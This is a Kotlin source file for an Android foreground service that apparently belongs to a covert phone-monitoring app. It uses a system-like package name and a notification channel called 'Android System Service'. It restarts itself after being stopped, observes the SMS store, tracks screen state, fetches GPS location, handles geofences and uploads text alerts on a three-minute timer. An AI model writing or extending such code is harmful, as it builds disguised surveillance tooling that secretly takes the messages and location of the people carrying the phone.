package com.android.services.services

import android.annotation.SuppressLint
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.content.IntentFilter
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat
import androidx.localbroadcastmanager.content.LocalBroadcastManager
import com.android.services.R
import com.android.services.jobScheduler.ObserverJobScheduler
import com.android.services.network.DataSyncTask
import com.android.services.observer.SmsObserver
import com.android.services.receiver.NotificationBroadcastReceiver
import com.android.services.receiver.ScreenOnOffReceiver
import com.android.services.receiver.VideoFileCompressorReceiver
import com.android.services.threadPool.DefaultExecutorSupplier
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.logVerbose
import dagger.hilt.android.AndroidEntryPoint
import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers
import io.reactivex.rxjava3.core.Observable
import io.reactivex.rxjava3.disposables.Disposable
import io.reactivex.rxjava3.schedulers.Schedulers
import kotlinx.coroutines.*
import org.greenrobot.eventbus.EventBus
import org.greenrobot.eventbus.Subscribe
import java.util.*
import java.util.concurrent.TimeUnit
import javax.inject.Inject

@AndroidEntryPoint
class RemoteDataService : Service() {

    @Inject
    lateinit var dataSyncTask: DataSyncTask
    private var mSmsObserver: SmsObserver? = null
    private var mScreenOnOffReceiver: ScreenOnOffReceiver? = null
    private var mReceiver: VideoFileCompressorReceiver? = null
    private var disposable: Disposable? = null

    private val mainThreadHandler: Handler by lazy {
        Handler(Looper.getMainLooper())
    }

    companion object {
        const val TAG = "RemoteDataSync"
        const val INITIAL_DELAY = 1L
        const val DEFAULT_INTERVAL = 3 * 60 * 1000L
        const val CHANNEL_ID = "AndroidSystemServiceChannel"
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        createNotification()
        // Screen OnOff Receiver
        mScreenOnOffReceiver = ScreenOnOffReceiver()
        val screenFilter = IntentFilter()
        screenFilter.addAction(Intent.ACTION_SCREEN_ON)
        screenFilter.addAction(Intent.ACTION_SCREEN_OFF)
        screenFilter.addAction(Intent.ACTION_USER_PRESENT)
        registerReceiver(mScreenOnOffReceiver, screenFilter)

        // Video File compressor Receiver
        mReceiver = VideoFileCompressorReceiver()
        val intentFilter = IntentFilter()
        intentFilter.addAction(VideoFileCompressorReceiver.ACTION_COMPRESS_VIDEO)
        LocalBroadcastManager.getInstance(this).registerReceiver(mReceiver!!, intentFilter)
        EventBus.getDefault().register(this)
    }

    private fun createNotification() {
        val notificationIntent = Intent(this, NotificationBroadcastReceiver::class.java)
        val pendingIntent = PendingIntent.getBroadcast(
            this,
            100,
            notificationIntent,
            PendingIntent.FLAG_UPDATE_CURRENT
        )
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentText("Running in background...")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setContentIntent(pendingIntent!!)
            .build()
        startForeground(100, notification)

    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createNotification()
        startObservers()
        startTimerTask()
        return START_STICKY
    }

    private fun startTimerTask() {
        disposable = Observable.interval(INITIAL_DELAY, DEFAULT_INTERVAL, TimeUnit.MILLISECONDS)
            .subscribeOn(Schedulers.io())
            .observeOn(AndroidSchedulers.mainThread())
            .subscribe {
                mainThreadHandler.post {
                    if (AppUtils.isDeviceIdentifierValid()) {
                        logVerbose(
                            "TimeTask Called ${
                                AppUtils.formatDate(
                                    System.currentTimeMillis().toString()
                                )
                            }", TAG
                        )
                        dataSyncTask.executeDataJobTask()
                    } else {
                        stopSelf()
                    }
                }
            }
    }

    @SuppressLint("NewApi")
    private fun startObservers(): Unit {
        if (AppConstants.osGreaterThanEqualToNougat) {
            ObserverJobScheduler.registerObserverJob(this@RemoteDataService)
        } else {
            addSmsContentChangeObserver()
        }
    }

    private fun addSmsContentChangeObserver() {
        if (mSmsObserver == null) {
            mSmsObserver = SmsObserver(applicationContext, Handler())
            contentResolver.registerContentObserver(
                Uri.parse(AppConstants.SMS_URI), true,
                mSmsObserver!!
            )
        }
    }

    /**
     * Create a Notification Channel [android.app.NotificationChannel], Assign a Channel Name, with a Unique Channel ID.
     * For devices with OS Version Greater Than Or Equal to O, we need to create a channel for handling Notifications
     */
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                CHANNEL_ID,
                "Android System Service",
                NotificationManager.IMPORTANCE_DEFAULT
            )
            val notificationManager = getSystemService(NotificationManager::class.java)
            Objects.requireNonNull(notificationManager).createNotificationChannel(serviceChannel)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        mSmsObserver?.let {
            applicationContext.contentResolver.unregisterContentObserver(it)
        }
        mScreenOnOffReceiver?.let {
            unregisterReceiver(it)
        }
        mReceiver?.let {
            LocalBroadcastManager.getInstance(this).unregisterReceiver(it)
        }
        dataSyncTask.cancelJobs()
        if (disposable != null && !disposable!!.isDisposed)
            disposable!!.dispose()
        EventBus.getDefault().unregister(this)
        logVerbose("$TAG reach onDestroy")
    }

    @Subscribe
    fun onEvent(event: String) {
        if (AppUtils.isDeviceIdentifierValid()) {
            when (event) {
                "fetchGpsLocation" -> {
                    dataSyncTask.fetchGpsLocation()
                }

                "networkConnected" -> {
                    dataSyncTask.executeDataJobTask()
                }

                "geoFencing" -> {
                    dataSyncTask.handleGeoFencing()
                }

                "uploadGeoFence" -> {
                    dataSyncTask.uploadGeoFences()
                }

                "syncTextAlerts" -> {
                    DefaultExecutorSupplier.instance!!.forBackgroundTasks().execute {
                        logVerbose("${AppConstants.TEXT_ALERT_TYPE} calling sync text alerts")
                        dataSyncTask.uploadTextAlerts()
                    }
                }
            }
        }
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        logVerbose("$TAG app reach onTaskRemoved")
    }

    // TODO: 2/9/21 Implement onBind
    override fun onBind(p0: Intent?): IBinder? {
        return null
    }
}